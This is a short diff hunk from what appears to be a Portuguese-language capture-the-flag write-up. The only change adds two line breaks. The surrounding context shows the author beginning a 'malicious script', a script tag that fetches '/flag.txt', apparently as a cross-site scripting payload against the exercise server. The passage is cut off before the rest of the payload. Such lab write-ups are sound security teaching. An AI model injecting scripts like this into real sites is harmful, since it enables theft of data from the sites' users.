@@ -24,7 +24,8 @@ http://ctf-fsi.fe.up.pt:5007/?k304=y
 
 Vamos, então, construir o script malicioso:
 
-
+<br>
+<br>
 
 \<script\>  
 fetch('/flag.txt')  
